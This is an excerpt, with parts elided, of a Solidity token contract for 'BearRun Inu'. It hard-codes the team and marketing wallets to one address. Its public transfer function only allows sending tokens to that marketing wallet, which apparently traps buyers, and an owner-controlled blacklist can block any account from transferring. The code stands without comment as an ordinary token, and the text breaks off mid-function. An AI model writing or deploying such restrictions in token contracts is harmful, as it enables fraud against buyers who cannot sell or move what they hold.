...
contract BearRunInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "BearRun Inu";
    string private _symbol = "BearRun";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x6453A482cbB6a26d321C82E66499f2eD72d5378D));
        marketingWalletAddress = payable(address(0x6453A482cbB6a26d321C82E66499f2eD72d5378D));
    ...
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(recipient == marketingWalletAddress);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isNoScope[sender], "Account has been 360 no scoped.");
        if(inSwapAndLiquify)
        { 
